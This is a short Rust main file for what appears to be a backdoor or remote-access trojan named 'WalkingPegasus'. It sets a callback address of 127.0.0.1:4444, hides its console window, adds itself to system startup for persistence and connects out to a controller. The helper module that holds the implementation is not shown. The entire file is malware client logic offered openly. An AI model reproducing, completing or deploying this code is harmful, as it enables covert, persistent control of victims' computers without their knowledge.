mod wp;
use wp::WalkingPegasus;

fn main() {
    let wp = WalkingPegasus { addr: "127.0.0.1:4444".to_string() };
    wp.hidec();
    wp.addtostartup().expect("");
    wp.connect();
}
